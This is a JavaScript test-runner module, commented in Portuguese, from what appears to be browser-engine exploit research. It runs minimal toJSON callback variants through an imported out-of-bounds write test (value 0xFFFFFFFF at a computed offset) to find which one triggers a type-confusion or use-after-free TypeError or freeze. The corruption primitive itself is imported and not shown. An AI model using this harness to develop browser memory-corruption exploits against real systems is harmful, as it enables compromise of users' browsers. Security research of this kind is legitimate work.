// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';     

// --- Funções toJSON para teste de decomposição ULTRA MINIMALISTA ---
// 'current_toJSON_call_count_for_TypeError_test' é importado e modificado por estas funções.

// Variante 0: Absolutamente Mínima (apenas return {})
function toJSON_Decomp_V0_ReturnEmptyObject() {
    // NÃO incrementa current_toJSON_call_count_for_TypeError_test aqui.
    // NÃO muda document.title aqui.
    // Teste mais puro para ver se a simples invocação/retorno causa o problema.
    return { payloadV0: "empty_object_returned", call_count_at_return: current_toJSON_call_count_for_TypeError_test }; 
}

// Variante 1: Apenas uma operação matemática local e retorna.
function toJSON_Decomp_V1_LocalMathOnly() {
    current_toJSON_call_count_for_TypeError_test++; // Incrementar para registrar a entrada na função
    document.title = `toJSON_Decomp_V1 Call ${current_toJSON_call_count_for_TypeError_test}`;
    let x = 1 + 1; // Operação puramente local
    return { payloadV1: true, res_math: x, call: current_toJSON_call_count_for_TypeError_test };
}

// Variante 2: Apenas incrementa o contador global e retorna.
// Esta é a variante que causou o TypeError consistentemente nos logs anteriores.
function toJSON_Decomp_V2_GlobalCounterOnly() {
    current_toJSON_call_count_for_TypeError_test++; // << PONTO DE FALHA ANTERIOR
    // document.title = `toJSON_Decomp_V2 Call ${current_toJSON_call_count_for_TypeError_test}`; // Comentado para isolar o contador
    return { payloadV2: true, call: current_toJSON_call_count_for_TypeError_test };
}

// Variante 3: Apenas muda document.title e retorna.
function toJSON_Decomp_V3_TitleOnly() {
    current_toJSON_call_count_for_TypeError_test++; 
    document.title = `toJSON_Decomp_V3 Call ${current_toJSON_call_count_for_TypeError_test}`; // << PONTO DE FALHA ANTERIOR
    return { payloadV3: true, call: current_toJSON_call_count_for_TypeError_test };
}

// Variante 4 (Referência do problema anterior): Tentativa de logS3
function toJSON_Decomp_V4_AttemptLogS3() {
    current_toJSON_call_count_for_TypeError_test++;
    const FNAME_toJSON_internal = "toJSON_Decomp_V4_Internal"; // Usar nome local para FNAME
    document.title = `toJSON_Decomp_V4 Call ${current_toJSON_call_count_for_TypeError_test}`;
    try {
        // Esta linha era o ponto de falha nos logs anteriores com logS3
        logS3(`[${FNAME_toJSON_internal}] Tentativa de logS3. Chamada ${current_toJSON_call_count_for_TypeError_test}! this: ${typeof this}`, "critical", FNAME_toJSON_internal);
    } catch (e) {
        console.error("ERRO DENTRO de toJSON_Decomp_V4_AttemptLogS3 ao chamar logS3:", e);
        document.title = "ERRO INTERNO toJSON_Decomp_V4"; // Sinalizar erro interno
        // Re-lançar o erro para que executeFocusedTestForTypeError possa capturá-lo como erro do stringify.
        // Se não re-lançar, JSON.stringify pode receber 'undefined' e não registrar erro.
        throw e; 
    }
    return { payloadV4: true, logged_attempted: true, call: current_toJSON_call_count_for_TypeError_test };
}


async function runUltraMinimalDecompositionForTypeError() { // Nome da função atualizado
    const FNAME_RUNNER = "runUltraMinimalDecompositionForTypeError";
    logS3(`==== INICIANDO Decomposição Ultra-Minimalista do Gatilho do TypeError ====`, 'test', FNAME_RUNNER);

    const tests = [
        { description: "Decomp_V0_ReturnEmptyObject", func: toJSON_Decomp_V0_ReturnEmptyObject },
        { description: "Decomp_V1_LocalMathOnly", func: toJSON_Decomp_V1_LocalMathOnly },
        { description: "Decomp_V2_GlobalCounterOnly", func: toJSON_Decomp_V2_GlobalCounterOnly },
        { description: "Decomp_V3_TitleOnly", func: toJSON_Decomp_V3_TitleOnly },
        { description: "Decomp_V4_AttemptLogS3", func: toJSON_Decomp_V4_AttemptLogS3 },
    ];

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    for (const test of tests) {
        logS3(`\n--- Testando Variante toJSON: ${test.description} ---`, 'subtest', FNAME_RUNNER);
        document.title = `Iniciando SubTeste: ${test.description}`; 
        
        const result = await executeFocusedTestForTypeError(
            test.description,
            test.func,
            valueForCorruption,
            criticalOffset
        );
        
        // Log de resultado detalhado
        if (result.errorOccurred) {
            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.potentiallyCrashed) {
            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Resultado de Stringify: ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        }
        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        if (document.title.startsWith("CONGELOU?")) {
            logS3("Congelamento detectado, interrompendo próximos testes de decomposição.", "error", FNAME_RUNNER);
            break;
        }
    }

    logS3(`==== Decomposição Ultra-Minimalista do Gatilho do TypeError CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UltraMinimalDecompForTypeError'; // Nome atualizado
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    // LINHA CORRIGIDA ABAIXO:
    logS3(`==== INICIANDO Script 3: Decomposição Ultra-Minimalista do Gatilho do TypeError (Foco no \\\`victim_ab\\\`) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Decomp UltraMinimal (victim_ab)";
    
    await runUltraMinimalDecompositionForTypeError(); // Nome da função atualizado
    
    logS3(`\n==== Script 3 CONCLUÍDO (Decomposição Ultra-Minimalista do Gatilho do TypeError) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    }
    else {
        document.title = "Script 3 Concluído - Decomp UltraMinimal TypeError";
    }
}
